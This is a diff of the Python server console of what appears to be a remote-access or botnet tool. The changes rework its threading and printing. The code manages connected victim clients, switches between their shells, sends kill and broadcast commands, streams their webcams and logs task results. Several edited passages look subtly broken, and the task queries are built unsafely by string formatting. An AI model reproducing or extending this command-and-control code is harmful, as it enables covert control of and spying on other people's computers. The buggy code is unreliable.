@@ -96,7 +96,7 @@ ___DB___    = {
 
 
 # enable debugging mode for local network only
-__DEBUG__   = False
+__DEBUG__   = True
 
 
 # comment/uncomment the following line to disable/enable color 
@@ -112,11 +112,12 @@ class ServerThread(threading.Thread):
     def __init__(self, port, **kwargs):
         super(ServerThread, self).__init__()
         self.exit_status    = 0
-        self.lock           = threading.Event()
-        self.q              = Queue.Queue()
-        self.current_client = None
         self.clients        = {}
         self.count          = 1
+        self.current_client = None
+        self.q              = Queue.Queue()
+        self.shell          = threading.Event()
+        self.lock           = threading.Lock()
         self.commands       = {
 	    'background'    :   self.background_client,
             'back'          :   self.background_client,
@@ -157,14 +158,12 @@ class ServerThread(threading.Thread):
     
     def _error(self, data):
         if self.current_client:
-            self.current_client.lock.clear()
-            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
-            self.current_client.lock.set()
+            with self.current_client.lock:
+                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
         else:
-            self.lock.clear()
-            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
-            self.lock.set()
-        print(self._text_color + self._text_style)
+            with self.lock:
+                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
+            print(self._text_color + self._text_style)
 
     def _print(self, data):
         print(self._text_color + self._text_style)
@@ -174,27 +173,25 @@ class ServerThread(threading.Thread):
         except: 
             data = bytes(data)
         if self.current_client:
-            self.current_client.lock.clear()
-            try:
-                print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
-            except:
-                print("\n" + data)
-            self.current_client.lock.set()
+            with self.current_client.lock:
+                try:
+                    print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
+                except:
+                    print("\n" + data)
         else:
-            self.lock.clear()
-            try:
-                print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
-            except:
-                print("\n" + data)
-            self.lock.set()
+            with self.lock:
+                try:
+                    print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
+                except:
+                    print("\n" + data)
 
     def _return(self):
         if self.current_client:
-            self.lock.clear()
-            self.current_client.lock.set()
+            self.shell.clear()
+            self.current_client.shell.set()
             return self.current_client.run()
         else:
-            self.lock.set()
+            self.shell.set()
             return self.run()
 
     def _pad(self, data, block_size, padding='\x00'):
@@ -371,7 +368,7 @@ class ServerThread(threading.Thread):
                     return buf
             else:
                 self.remove_client(client.name)
-                self.lock.set()
+                self.shell.set()
                 self._return()
         except Exception as e:
             self._error("{} returned error: {}".format(self.recv_client.func_name, str(e)))
@@ -384,24 +381,25 @@ class ServerThread(threading.Thread):
             self._error('Unable to select client {} - Invalid Client ID'.format(client_id))
             self._return()
         else:
-            self.lock.clear()
+            self.shell.clear()
             if self.current_client:
-                self.current_client.lock.clear()
+                self.current_client.shell.clear()
             client = self.clients[int(client_id)]
             self.current_client = client
-            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.address[0]) + self._text_color + self._text_style)
-            print(self._text_color + self._text_style)
-            self.current_client.lock.set()
+            with self.lock and self.current_client.lock:
+                print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.address[0]) + self._text_color + self._text_style)
+                print(self._text_color + self._text_style)
+            self.current_client.shell.set()
             return self.current_client.run()
 
     def background_client(self, client_id=None):
         if not client_id:
             if self.current_client:
-                self.current_client.lock.clear()
+                self.current_client.shell.clear()
         elif str(client_id).isdigit() and int(client_id) in self.clients:
-                self.clients[int(client_id)].lock.clear()
+                self.clients[int(client_id)].shell.clear()
         self.current_client = None
-        self.lock.set()
+        self.shell.set()
         return self.run()
     
     def sendall_clients(self, msg):
@@ -418,7 +416,7 @@ class ServerThread(threading.Thread):
         else:
             try:
                 client = self.clients[int(client_id)]
-                client.lock.clear()
+                client.shell.clear()
                 self.send_client('kill', client_id)
                 try:
                     client.connection.close()
@@ -428,24 +426,24 @@ class ServerThread(threading.Thread):
                 except: pass
                 _ = self.clients.pop(int(client_id), None)
                 del _
+                print(self._text_color + self._text_style)
                 if not self.current_client:
-                    self.lock.clear()
-                    self._print('Client {} disconnected'.format(client_id))
-                    self.lock.set()
+                    with self.lock:
+                        print('Client {} disconnected'.format(client_id))
+                    self.shell.set()
+                    client.shell.clear()
                     return self.run()
                 elif int(client_id) == self.current_client.name:
-                    self.current_client.lock.clear()
-                    self.lock.set()
-                    self._print('Client {} disconnected'.format(client_id))
-                    self.lock.clear()
-                    self.current_client.lock.set()
+                    with self.current_client.lock:
+                        print('Client {} disconnected'.format(client_id))
+                    self.shell.clear()
+                    self.current_client.shell.set()
                     return self.current_client.run()
                 else:
-                    self.current_client.lock.clear()
-                    self.lock.set()
-                    self._print('Client {} disconnected'.format(client_id))
-                    self.lock.clear()
-                    self.current_client.lock.set()
+                    with self.lock:
+                        print('Client {} disconnected'.format(client_id))
+                    self.shell.clear()
+                    self.current_client.shell.set()
                     return self.current_client.run()
             except Exception as e:
                 self._error('{} failed with error: {}'.format(self.remove_client.func_name, str(e)))
@@ -467,6 +465,7 @@ class ServerThread(threading.Thread):
         exit()
 
     def settings(self, args=None):
+        self.current_client.lock.acquire() if self.current_client else self.lock.acquire()
         if not args:
             print(colorama.Fore.RESET + colorama.Style.BRIGHT + '\n\t\tSettings')
             print(self._text_color + self._text_style + '\tdefault text color + style')
@@ -476,35 +475,38 @@ class ServerThread(threading.Thread):
             target, _, options = args.partition(' ')
             setting, _, option = options.partition(' ')
             option = option.upper()
+            print(self._text_color + self._text_style)
             if target == 'prompt':                
                 if setting == 'color':
                     if not hasattr(colorama.Fore, option):
-                        self._print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
+                        print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                     self._prompt_color = getattr(colorama.Fore, option)
-                    self._print("prompt color changed to '{}'".format(option))
+                    print("prompt color changed to '{}'".format(option))
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
                         self._print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                     self._prompt_style = getattr(colorama.Style, option)
-                    self._print("prompt style changed to '{}'".format(option))
+                    print("prompt style changed to '{}'".format(option))
                 else:
-                    self._print("usage: settings prompt <option> [value]")
+                    print("usage: settings prompt <option> [value]")
             elif target == 'text':
                 if setting == 'color':
                     if not hasattr(colorama.Fore, option):
                         self._print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                     self._text_color = getattr(colorama.Fore, option)
-                    self._print("text color changed to '{}'".format(option))
+                    print("text color changed to '{}'".format(option))
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
                         self._print("usage: settings text style [value]\nstyles:     bright/normal/dim")
                     self._text_style = getattr(colorama.Style, option)
-                    self._print("text style changed to '{}'".format(option))
+                    print("text style changed to '{}'".format(option))
                 else:
-                    self._print("usage: settings text <option> [value]")
+                    print("usage: settings text <option> [value]")
+        self.current_client.lock.release() if self.current_client else self.lock.release()
         self._return()
 
     def usage(self):
+        self.current_client.lock.acquire() if self.current_client else self.lock.acquire()
         print('\n')
         print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
         print(self._text_color + colorama.Style.BRIGHT + '    command <argument>      ' + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' descripton')
@@ -522,6 +524,7 @@ class ServerThread(threading.Thread):
         print(self._text_color + self._text_style + '< > = required argument')
         print(self._text_color + self._text_style+ '[ ] = optional argument\n')
         print('\n')
+        self.current_client.lock.release() if self.current_client else self.lock.release()
 
 
     def webcam_client(self, args=''):
@@ -531,7 +534,7 @@ class ServerThread(threading.Thread):
             client = self.current_client
             result = ''
             mode, _, arg = args.partition(' ')
-            client.lock.clear()
+            client.shell.clear()
             if not mode or str(mode).lower() == 'stream':
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 retries = 5
@@ -569,7 +572,7 @@ class ServerThread(threading.Thread):
                 finally:
                     conn.close()
                     cv2.destroyAllWindows()
-                    client.lock.set()
+                    client.shell.set()
             else:
                 self.send_client("webcam %s" % args, client.name)
         except Exception as e:
@@ -639,9 +642,13 @@ class ServerThread(threading.Thread):
             return self.query_database("SELECT * FROM tasks WHERE session_id='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""))
         elif self.current_client:
             client = self.current_client
-            return self.query_database("SELECT * FROM tasks WHERE session_id='{}'".format(self.current_client.session).replace("Array\n(", "").replace("\n)", ""))
         else:
-            return "No client selected"
+            self._error("No client selected")
+            self._return()
+        try:
+            return self.query_database("SELECT * FROM tasks WHERE session_id='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""))
+        except Exception as e:
+            self._error("{} returned error: {}".format(self.show_task_results.func_name, str(e)))
     
     def save_task_results(self, task):
         if type(task) is dict and task.get('id') != '0000000000000000000000000000000000000000000000000000000000000000':
@@ -676,15 +683,22 @@ class ServerThread(threading.Thread):
                         return output
                     else:
                         if '\n' in output:
-                            for row in output.split('\n'):
-                                try:
-                                    self._print(row)
-                                except: break
-                        else:
                             try:
-                                self._print(output)
-                            except:
-                                print(bytes(output))
+                                i = 0
+                                output = output.split('\n')
+                                result = {}
+                                while i < len(output):
+                                    if len(output):
+                                        result.update({str(i + 1): json.loads(output)})
+                                    else:
+                                        break
+                                    i += 1
+                                self._print(json.dumps(result))
+                            except Exception as e:
+                                for item in output.split('\n'):
+                                    self._print(output)
+                        else:
+                            self._print(output)
         else:
             self._error("No session key found")
     
@@ -702,7 +716,7 @@ class ServerThread(threading.Thread):
     def run(self):
         while True:
             try:
-                self.lock.wait()
+                self.shell.wait()
                 output              = ''
                 cmd_buffer          = self._prompt("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd())
                 if cmd_buffer:
@@ -735,7 +749,7 @@ class ServerThread(threading.Thread):
         threads[self.run.func_name] = threading.Thread(target=self.run, name=time.time())
         threads[self.connection_handler.func_name].start()
         threads[self.run.func_name].start()
-        self.lock.set()
+        self.shell.set()
 
 
 class ClientHandler(threading.Thread):
@@ -745,8 +759,9 @@ class ClientHandler(threading.Thread):
     def __init__(self, connection, **kwargs):
         super(ClientHandler, self).__init__()
         self.prompt         = None
+        self.shell          = threading.Event()
+        self.lock           = threading.Lock()
         self.connection     = connection
-        self.lock           = threading.Event()
         self.name           = kwargs.get('name')
         self.address        = kwargs.get('address')
         self.public_key     = kwargs.get('public_key')
@@ -822,7 +837,7 @@ class ClientHandler(threading.Thread):
             try:
                 if threads['server'].exit_status:
                     break
-                self.lock.wait()
+                self.shell.wait()
                 task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
                 if type(task) is dict:
                     if 'prompt' in task.get('task'):
@@ -845,10 +860,10 @@ class ClientHandler(threading.Thread):
             except Exception as e:
                 self._error(str(e))
                 break
-        self.lock.clear()
-        threads['server'].lock.set()
-        threads['server'].current_client = None
+        self.shell.clear()
+        threads['server'].shell.set()
         threads['server'].remove_client(self.name)
+        threads['server'].current_client = None
         threads['server'].run()
 
 
